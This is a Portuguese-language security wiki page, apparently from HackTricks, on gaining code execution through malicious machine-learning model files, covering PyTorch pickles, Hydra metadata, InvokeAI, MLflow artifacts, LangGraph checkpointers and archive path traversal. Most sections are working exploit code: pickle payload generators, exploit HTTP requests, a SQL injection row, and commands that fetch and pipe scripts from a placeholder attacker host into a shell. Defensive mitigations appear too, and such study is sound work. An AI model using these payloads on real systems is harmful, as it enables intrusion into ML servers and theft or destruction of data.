# RCE com modelos

{{#include ../banners/hacktricks-training.md}}

## Carregando modelos para RCE

Modelos de Machine Learning geralmente são compartilhados em diferentes formatos, como ONNX, TensorFlow, PyTorch etc. Esses modelos podem ser carregados nas máquinas dos desenvolvedores ou em sistemas de produção. Em geral, os modelos não deveriam conter código malicioso, mas há casos em que podem ser usados para executar código arbitrário no sistema, seja como recurso intencional ou devido a uma vulnerabilidade na biblioteca de carregamento de modelos.

A tabela a seguir lista vulnerabilidades representativas dessa categoria:

| **Framework / Ferramenta** | **Vulnerabilidade (CVE, se disponível)** | **Vetor de RCE** | **Referências** |
|----------------------------|------------------------------------------|------------------|-----------------|
| **PyTorch** (Python)        | *Desserialização insegura em* `torch.load` **(CVE-2025-32434)** | Pickle malicioso no checkpoint do modelo leva à execução de código (contornando a proteção `weights_only`) | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471** | SSRF + download de modelo malicioso causa execução de código; RCE por desserialização Java na API de gerenciamento | |
| **NVIDIA Merlin Transformers4Rec** | Desserialização insegura de checkpoint via `torch.load` **(CVE-2025-23298)** | Um checkpoint não confiável aciona o reducer do pickle durante `load_model_trainer_states_from_checkpoint` → execução de código no worker de ML | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)<sup>[[6]](#references)</sup> |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + hook de extensão inseguro do MessagePack **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | A chave `filter` controlada pelo usuário injeta sintaxe SQL/JSON-path, `UNION SELECT` cria uma linha de checkpoint falsa e, em seguida, a desserialização de `msgpack` importa e chama código Python escolhido pelo atacante | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (YAML inseguro) <br> **CVE-2024-3660** (Keras Lambda) | Carregar um modelo de YAML usa `yaml.unsafe_load` (execução de código) <br> Carregar um modelo com uma camada **Lambda** executa código Python arbitrário | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (análise de TFLite) | Um modelo `.tflite` criado especialmente aciona um integer overflow → corrupção do heap (possível RCE) | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle) | Carregar um modelo via `joblib.load` executa o pickle com o payload `__reduce__` do atacante | |
| **NumPy** (Python)          | **CVE-2019-6446** (`np.load` inseguro) *contestada* | O padrão de `numpy.load` permitia arrays de objetos em pickle – um `.npy/.npz` malicioso aciona execução de código | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal) | O caminho dos pesos externos do modelo ONNX pode escapar do diretório (leitura de arquivos arbitrários) <br> Um tar de modelo ONNX malicioso pode sobrescrever arquivos arbitrários (levando a RCE) | |
| ONNX Runtime (risco de design) | *(Sem CVE)* Custom ops / fluxo de controle do ONNX | Um modelo com operador customizado exige carregar código nativo do atacante; grafos de modelos complexos abusam da lógica para executar cálculos não pretendidos | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal) | Usar a API de carregamento de modelos com `--model-control` ativado permite path traversal relativo para gravar arquivos (por exemplo, sobrescrever `.bashrc` para obter RCE) | |
| **GGML (formato GGUF)**     | **CVE-2024-25664 … 25668** (vários heap overflows) | Um arquivo de modelo GGUF malformado causa heap buffer overflows no parser, permitindo a execução de código arbitrário no sistema da vítima | |
| **Keras (formatos antigos)** | *(Sem nova CVE)* Modelo Keras H5 legado | O código de uma camada Lambda em um modelo HDF5 (`.h5`) malicioso ainda é executado ao carregar o modelo (o `safe_mode` do Keras não cobre o formato antigo – “ataque de downgrade”) | |
| **Outros** (geral)          | *Falha de design* – serialização Pickle | Muitas ferramentas de ML (por exemplo, formatos de modelos baseados em pickle, `pickle.load` do Python) executam código arbitrário incorporado em arquivos de modelo, a menos que isso seja mitigado | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Metadados não confiáveis passados para `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Metadados/configuração do modelo controlados pelo atacante definem `_target_` como um callable arbitrário (por exemplo, `builtins.exec`) → executado durante o carregamento, mesmo com formatos “seguros” (`.safetensors`, `.nemo`, `config.json` do repositório) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Além disso, há modelos baseados em pickle do Python, como os usados pelo [PyTorch](https://github.com/pytorch/pytorch/security), que podem ser usados para executar código arbitrário no sistema caso não sejam carregados com `weights_only=True`. Portanto, qualquer modelo baseado em pickle pode ser especialmente suscetível a esse tipo de ataque, mesmo que não esteja listado na tabela acima.

### Metadados do Hydra → RCE (funciona mesmo com safetensors)

`hydra.utils.instantiate()` importa e chama qualquer `_target_` com notação de ponto em um objeto de configuração/metadados. Quando bibliotecas como Hugging Face Transformers passam **metadados de modelo não confiáveis** para `instantiate()`, um atacante pode fornecer um callable e argumentos que são executados imediatamente durante o carregamento do modelo (sem necessidade de pickle).<sup>[[11]](#references)</sup><sup>[[12]](#references)</sup><sup>[[13]](#references)</sup>

Exemplo de payload (funciona em `model_config.yaml` de `.nemo`, `config.json` do repositório ou `__metadata__` dentro de `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Pontos principais:
- Acionado antes da inicialização do modelo em `restore_from/from_pretrained` do NeMo, nos coders HuggingFace do uni2TS e nos loaders do FlexTok.
- A block-list de strings do Hydra pode ser contornada usando caminhos de importação alternativos (por exemplo, `enum.bltns.eval`) ou nomes resolvidos pela aplicação (por exemplo, `nemo.core.classes.common.os.system` → `posix`).<sup>[[14]](#references)</sup>
- O FlexTok também analisa metadados serializados como strings com `ast.literal_eval`, possibilitando DoS (esgotamento de CPU/memória) antes da chamada do Hydra.

### 🆕 InvokeAI RCE via `torch.load` (CVE-2024-12029)

O `InvokeAI` é uma interface web popular e open source para Stable-Diffusion. As versões **5.3.1 – 5.4.2** expõem o endpoint REST `/api/v2/models/install`, que permite aos usuários baixar e carregar modelos de URLs arbitrárias.<sup>[[1]](#references)</sup>

Internamente, o endpoint acaba chamando:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

Quando o arquivo fornecido é um **checkpoint do PyTorch (`*.ckpt`)**, `torch.load` realiza uma **desserialização com pickle**. Como o conteúdo vem diretamente da URL controlada pelo usuário, um atacante pode inserir um objeto malicioso com um método `__reduce__` personalizado no checkpoint; o método é executado **durante a desserialização**, levando à **execução remota de código (RCE)** no servidor InvokeAI.

A vulnerabilidade recebeu o identificador **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Passo a passo da exploração

1. Crie um checkpoint malicioso:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Hospede `payload.ckpt` em um servidor HTTP que você controla (por exemplo, `http://ATTACKER/payload.ckpt`).
3. Acione o endpoint vulnerável (não é necessária autenticação):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. Quando o InvokeAI baixa o arquivo, ele chama `torch.load()` → o gadget `os.system` é executado e o atacante obtém execução de código no contexto do processo do InvokeAI.

Exploit pronto para uso: o módulo **Metasploit** `exploit/linux/http/invokeai_rce_cve_2024_12029` automatiza todo o fluxo.<sup>[[3]](#references)</sup>

#### Condições

•  InvokeAI 5.3.1-5.4.2 (flag de scan com valor padrão **false**)
•  `/api/v2/models/install` acessível pelo atacante
•  O processo tem permissões para executar comandos de shell

#### Mitigações

* Atualize para **InvokeAI ≥ 5.4.3** – o patch define `scan=True` como padrão e realiza a verificação de malware antes da desserialização.<sup>[[2]](#references)</sup>
* Ao carregar checkpoints programaticamente, use `torch.load(file, weights_only=True)` ou o novo helper [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security).
* Aplique allow-lists / assinaturas às fontes dos modelos e execute o serviço com o mínimo de privilégios.

> ⚠️ Lembre-se de que **qualquer** formato baseado em pickle do Python (incluindo muitos arquivos `.pt`, `.pkl`, `.ckpt`, `.pth`) é inerentemente inseguro para desserializar a partir de fontes não confiáveis.

---

Exemplo de mitigação improvisada, caso seja necessário manter versões antigas do InvokeAI em execução atrás de um reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via `torch.load` inseguro (CVE-2025-23298)

O Transformers4Rec da NVIDIA (parte do Merlin) expôs um carregador de checkpoint inseguro que chamava diretamente `torch.load()` em caminhos fornecidos pelo usuário. Como `torch.load` depende do Python `pickle`, um checkpoint controlado por um atacante pode executar código arbitrário por meio de um reducer durante a desserialização.<sup>[[5]](#references)</sup>

Caminho vulnerável (pré-correção): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Por que isso leva a RCE: no Python `pickle`, um objeto pode definir um reducer (`__reduce__`/`__setstate__`) que retorna um callable e argumentos. O callable é executado durante a desserialização. Se esse objeto estiver presente em um checkpoint, ele é executado antes de qualquer peso ser usado.

Exemplo mínimo de checkpoint malicioso:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Vetores de entrega e raio de impacto:
- Checkpoints/modelos trojanizados compartilhados por meio de repos, buckets ou registros de artefatos
- Pipelines automatizados de retomada/implantação que carregam checkpoints automaticamente
- A execução ocorre dentro de workers de treinamento/inferência, muitas vezes com privilégios elevados (por exemplo, root em containers)

Correção: o commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) substituiu a chamada direta a `torch.load()` por um desserializador restrito, com lista de permissões, implementado em `transformers4rec/utils/serialization.py`. O novo loader valida tipos/campos e impede que funções arbitrárias sejam invocadas durante o carregamento.<sup>[[7]](#references)</sup>

Orientações de defesa específicas para checkpoints do PyTorch:
- Não desserialize dados não confiáveis com pickle. Prefira formatos não executáveis, como [Safetensors](https://huggingface.co/docs/safetensors/index) ou ONNX, sempre que possível.
- Se precisar usar a serialização do PyTorch, garanta que `weights_only=True` (compatível com versões mais recentes do PyTorch) ou use um unpickler personalizado com lista de permissões, semelhante ao patch do Transformers4Rec.<sup>[[4]](#references)</sup>
- Exija a procedência/assinaturas do modelo e coloque a desserialização em sandbox (seccomp/AppArmor; usuário sem privilégios de root; sistema de arquivos restrito e sem tráfego de saída de rede).
- Monitore processos filhos inesperados originados por serviços de ML no momento do carregamento de checkpoints; rastreie o uso de `torch.load()`/`pickle`.

Referências de POC e da versão vulnerável/patch:<sup>[[8]](#references)</sup><sup>[[9]](#references)</sup><sup>[[10]](#references)</sup>
- Loader vulnerável anterior ao patch: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js<sup>[[8]](#references)</sup>
- POC de checkpoint malicioso: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js<sup>[[9]](#references)</sup>
- Loader posterior ao patch: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js<sup>[[10]](#references)</sup>

## Exemplo – criando um modelo PyTorch malicioso

- Crie o modelo:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Carregue o modelo:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Desserialização Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

O FaceDetection-DSFD da Tencent expõe um endpoint `resnet` que desserializa dados controlados pelo usuário. A ZDI confirmou que um atacante remoto pode induzir uma vítima a carregar uma página/arquivo malicioso, fazer com que ele envie um blob serializado especialmente criado para esse endpoint e acionar a desserialização como `root`, levando ao comprometimento total.

O fluxo de exploração é semelhante ao abuso típico de pickle:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Qualquer gadget acessível durante a desserialização (construtores, `__setstate__`, callbacks de frameworks etc.) pode ser weaponized da mesma forma, independentemente de o transporte ser HTTP, WebSocket ou um arquivo colocado em um diretório monitorado.



### LangGraph checkpointer SQLi → MessagePack RCE

Esta cadeia de ataque é interessante porque o atacante **não precisa fazer upload de um arquivo de modelo malicioso**. Em vez disso, a aplicação expõe uma **API de persistência de AI-agent** (`get_state_history(..., filter=...)`), e a entrada do usuário chega ao construtor de consultas do checkpointer.

#### 1. SQLi estrutural em filtros de metadados

Um padrão vulnerável de SQLite era assim:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

O valor é vinculado posteriormente, mas `query_key` é concatenado à **string do caminho JSON**, então um `'` dentro da chave do dicionário escapa de `'$.{query_key}'` e injeta SQL. A mesma lição se aplica a **caminhos JSON, identificadores, operadores, `LIMIT` e campos TTL**: placeholders protegem apenas valores, não a sintaxe estrutural da consulta.

#### 2. `UNION SELECT` pode atingir sinks posteriores, não apenas roubar dados

A consulta retorna `type` e bytes serializados de `checkpoint`, que são consumidos posteriormente como:

```python
self.serde.loads_typed((type, checkpoint))
```

Isso significa que uma SQLi na cláusula `WHERE` pode injetar uma **linha de resultado falsa**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

Se um código posterior analisar, desserializar, gravar ou executar qualquer coluna selecionada, mapeie essas colunas para seus sinks. Nesse caso, a linha falsa transforma SQLi em **desserialização controlada pelo atacante**.

#### 3. Hooks de extensão inseguros do MessagePack equivalem a gadgets de código

O caminho `msgpack` do LangGraph usava um hook de extensão personalizado que desempacotava uma tupla aninhada e executava:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

Assim, um objeto de extensão MessagePack que codifique algo equivalente a `("os", "system", "id > /tmp/pwned")` importa `os`, resolve `system` e executa o comando. Ao revisar frameworks de AI, inspecione **revivers personalizados de MessagePack/JSON/pickle** em busca de imports dinâmicos, reflection ou dispatch arbitrário de callables.

#### 4. Padrão prático de auditoria para frameworks de agentes

Revise qualquer entrada controlada pelo usuário que chegue a:
- APIs de histórico de estado / memória / replay / listagem de checkpoints
- builders de filtros estruturados que geram SQL ou fragmentos de consulta Redis
- desserializadores personalizados (`pickle`, `msgpack`, hooks de objetos `json`, construtores YAML)
- caminhos de recuperação que confiam nas linhas retornadas pela camada de persistência

Essa cadeia específica afetou implantações self-hosted do LangGraph que usavam checkpointers **SQLite** ou **Redis** quando usuários não confiáveis podiam controlar `filter`. As versões corrigidas indicadas na divulgação foram `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+` e `langgraph-checkpoint 4.0.1+`.<sup>[[15]](#references)</sup>

### Sobrescrita de artifact PyFunc do MLflow para RCE via pickle

Um PyFunc do MLflow criado a partir de um `PythonModel` pode armazenar o objeto serializado como `python_model.pkl`. Os metadados do modelo indicam `mlflow.pyfunc.model` como seu loader, e a implementação do MLflow usa esse nome de arquivo para o modelo Python salvo. Consequentemente, o acesso de escrita ao artifact store pode levar à execução de código em outra aplicação que carregue o modelo posteriormente.<sup>[[17]](#references)[[18]](#references)</sup>

A cadeia útil é **permissão de escrita em artifacts → substituir o pickle → fazer com que um consumidor de inferência o carregue novamente**. Para um experimento que use uma raiz `mlflow-artifacts:/...` com proxy, enumere o experimento, a execução e o caminho do artifact do modelo. O servidor de tracking expõe `GET` e `PUT` em `/api/2.0/mlflow-artifacts/artifacts/<artifact-path>`.<sup>[[19]](#references)[[20]](#references)</sup>

```bash
# Preserve a copy and confirm the exact object first
curl -u USER:PASS \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  -o original.pkl

# Upload the pickle without curl transforming its bytes
curl -u USER:PASS -X PUT \
  'http://MLFLOW/api/2.0/mlflow-artifacts/artifacts/EXP/RUN/artifacts/model/python_model.pkl' \
  --data-binary @payload.pkl
```

Um reducer mínimo pode executar um comando assim que o consumidor desserializa o artefato com pickle. Gerar o payload usando a versão do Python declarada em `MLmodel` evita problemas de compatibilidade.<sup>[[17]](#references)[[20]](#references)</sup>

```python
import os
import pickle

class Payload:
    def __reduce__(self):
        return os.system, ("ping -c 1 ATTACKER",)

with open("payload.pkl", "wb") as f:
    pickle.dump(Payload(), f)
```

Acione a operação que **carrega o modelo existente**, como previsão, pontuação ou implantação. Não treine novamente antes, pois o treinamento pode substituir o artefato malicioso por um modelo novo. Um erro da aplicação não descarta a exploração: o reducer retorna o status de saída inteiro do comando, em vez de um modelo utilizável. Comece com um efeito colateral observável, como ICMP ou um callback HTTP, e depois substitua-o pelo payload final.<sup>[[20]](#references)</sup>

Durante a avaliação, diferencie a permissão para criar uma execução da permissão para sobrescrever artefatos pertencentes a outra execução. Revise a autenticação e as permissões de atualização por execução, inspecione modificações inesperadas em `python_model.pkl` e trate a procedência e a integridade do modelo como parte do limite de execução. O código atual do MLflow também permite definir `MLFLOW_ALLOW_PICKLE_DESERIALIZATION=false` e recomenda artefatos models-from-code em vez de carregar dados cloudpickle.<sup>[[18]](#references)[[19]](#references)[[20]](#references)</sup>

## Modelos para Path Traversal

Conforme comentado [**nesta publicação de blog**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), a maioria dos formatos de modelo usados por diferentes frameworks de IA se baseia em arquivos compactados, geralmente `.zip`. Portanto, pode ser possível abusar desses formatos para realizar ataques de path traversal e ler arquivos arbitrários do sistema onde o modelo é carregado.<sup>[[16]](#references)</sup>

Por exemplo, com o código a seguir, você pode criar um modelo que criará um arquivo no diretório `/tmp` quando for carregado:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Ou, com o seguinte código, você pode criar um modelo que criará um symlink para o diretório `/tmp` quando carregado:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Análise aprofundada: desserialização de Keras .keras e gadget hunting

Para um guia focado nos componentes internos de .keras, RCE por camada Lambda, o problema de importação arbitrária em ≤ 3.8 e a descoberta de gadgets dentro da allowlist após a correção, consulte:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [1] [Blog da OffSec – "CVE-2024-12029 – Desserialização de dados não confiáveis no InvokeAI"](https://www.offsec.com/blog/cve-2024-12029/)
- [2] [Commit de correção do InvokeAI 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [3] [Documentação do módulo Metasploit da Rapid7](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [4] [PyTorch – considerações de segurança para torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [5] [Blog da ZDI – CVE-2025-23298: obtendo execução remota de código no NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [6] [Aviso da ZDI: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [7] [Commit de correção do Transformers4Rec b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [8] [Loader vulnerável antes da correção (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [9] [PoC de checkpoint malicioso (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [10] [Loader após a correção (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [11] [Transformers do Hugging Face](https://github.com/huggingface/transformers)
- [12] [Unit 42 – Execução remota de código com formatos e bibliotecas modernas de IA/ML](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [13] [Documentação de Hydra instantiate](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [14] [Commit da block-list do Hydra (aviso sobre RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [15] [Check Point Research – De SQLi a RCE: explorando o checkpointer do LangGraph](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)
- [16] [Transformando bugs de archive slip em oportunidades de alto valor em programas de bug bounty de IA/ML](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties)
- [17] [Aviso da Snyk e prova de conceito de PyFunc – CVE-2024-37054](https://security.snyk.io/vuln/SNYK-PYTHON-MLFLOW-7210300)
- [18] [Código-fonte do MLflow – PyFunc `model.py`](https://github.com/mlflow/mlflow/blob/master/mlflow/pyfunc/model.py)
- [19] [API REST do MLflow – endpoints de download e upload de artefatos](https://mlflow.org/docs/latest/api_reference/rest-api.html)
- [20] [0xdf – HTB: SmartHire](https://0xdf.gitlab.io/2026/09/26/htb-smarthire.html)
{{#include ../banners/hacktricks-training.md}}
